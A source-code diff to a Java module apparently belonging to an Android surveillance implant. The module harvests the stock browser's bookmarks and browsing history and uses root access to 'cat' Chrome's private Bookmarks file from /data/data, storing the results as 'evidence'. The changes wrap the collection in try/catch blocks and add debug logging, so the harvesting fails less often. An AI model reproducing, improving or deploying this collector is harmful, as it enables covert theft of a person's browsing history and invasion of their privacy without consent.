@@ -43,6 +43,7 @@ import java.util.Date;
 import java.util.Dictionary;
 import java.util.Hashtable;
 import java.util.List;
+import java.util.concurrent.ExecutionException;
 
 import javax.xml.parsers.DocumentBuilderFactory;
 
@@ -84,30 +85,34 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveUrlsBrowser), timestamp: " + lastTimestamp);
 		}
-
-		String[] proj = new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.BOOKMARK, Browser.BookmarkColumns.DATE};
-		String sel = Browser.BookmarkColumns.DATE + " > " + lastTimestamp;
-		//String sel = null;
-		Cursor mCur = Status.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
-		mCur.moveToFirst();
-
+		
 		long maxTimestamp = lastTimestamp;
-
-
 		try {
+			String[] proj = new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.BOOKMARK, Browser.BookmarkColumns.DATE};
+			String sel = Browser.BookmarkColumns.DATE + " > " + lastTimestamp;
+			//String sel = null;
+			Cursor mCur = Status.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
+			mCur.moveToFirst();
+
 			if (mCur.moveToFirst() && mCur.getCount() > 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveUrls), records: " + mCur.getCount());
 				}
 				while (mCur.isAfterLast() == false) {
-					String title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
-					String url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
-					boolean bookmark = mCur.getInt(mCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK)) == 1; // 0 = history, 1 = bookmark
-					long timestamp = mCur.getLong(mCur.getColumnIndex(Browser.BookmarkColumns.DATE));
-					maxTimestamp = Math.max(timestamp, maxTimestamp);
+					try {
+						String title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
+						String url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
+						boolean bookmark = mCur.getInt(mCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK)) == 1; // 0 = history, 1 = bookmark
+						long timestamp = mCur.getLong(mCur.getColumnIndex(Browser.BookmarkColumns.DATE));
+						maxTimestamp = Math.max(timestamp, maxTimestamp);
 
-		 			//saveEvidence(8, url, title, bookmark, new Date(timestamp));
-					bs.put(url, new Bookmark(8, url, title, true, new Date()));
+						//saveEvidence(8, url, title, bookmark, new Date(timestamp));
+						bs.put(url, new Bookmark(8, url, title, true, new Date()));
+					}catch (Exception ex){
+						if (Cfg.DEBUG){
+							Check.log(TAG + " (saveUrlsBrowser), ERROR: " + ex);
+						}
+					}
 					mCur.moveToNext();
 				}
 			}
@@ -121,7 +126,6 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 
 	}
 
-
 	private synchronized long saveUrlsChrome(Hashtable<String, Bookmark> bs, long lastTimestamp) {
 
 		///data/data/com.android.chrome/app_chrome/Default/Bookmarks
@@ -131,21 +135,27 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 
 		long maxtimestamp = lastTimestamp;
 
-		if(Status.haveRoot()){
-			ExecuteResult res = Execute.executeRoot("cat /data/data/com.android.chrome/app_chrome/Default/Bookmarks");
-			String js = res.getStdout();
-			try {
-				JSONObject obj = new JSONObject(js);
-				JSONObject r = obj.getJSONObject("roots");
+		try {
+			if (Status.haveRoot()) {
+				ExecuteResult res = Execute.executeRoot("cat /data/data/com.android.chrome/app_chrome/Default/Bookmarks");
+				String js = res.getStdout();
+				try {
+					JSONObject obj = new JSONObject(js);
+					JSONObject r = obj.getJSONObject("roots");
 
-				maxtimestamp = saveChildren(bs, "bookmark_bar", lastTimestamp, maxtimestamp, r);
-				maxtimestamp = saveChildren(bs, "synced", lastTimestamp, maxtimestamp, r);
-				maxtimestamp = saveChildren(bs, "other", lastTimestamp, maxtimestamp, r);
+					maxtimestamp = saveChildren(bs, "bookmark_bar", lastTimestamp, maxtimestamp, r);
+					maxtimestamp = saveChildren(bs, "synced", lastTimestamp, maxtimestamp, r);
+					maxtimestamp = saveChildren(bs, "other", lastTimestamp, maxtimestamp, r);
 
-			} catch (Exception e) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (openBBMChatEnc), ERROR", e);
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (openBBMChatEnc), ERROR", e);
+					}
 				}
+			}
+		}catch(Exception ex){
+			if (Cfg.DEBUG){
+				Check.log(TAG + " (saveUrlsChrome), ERROR: " + ex);
 			}
 		}
 
@@ -239,6 +249,9 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 	}
 
 	void saveUrls(boolean browser, boolean chrome) {
+		if (Cfg.DEBUG){
+			Check.log(TAG + " (saveUrls)");
+		}
 		long lastTimestamp = markupUrl.unserialize(new Long(-1));
 		long m1 = 0, m2 = 0;
 		Hashtable<String, Bookmark> bs = new Hashtable<String,Bookmark>();
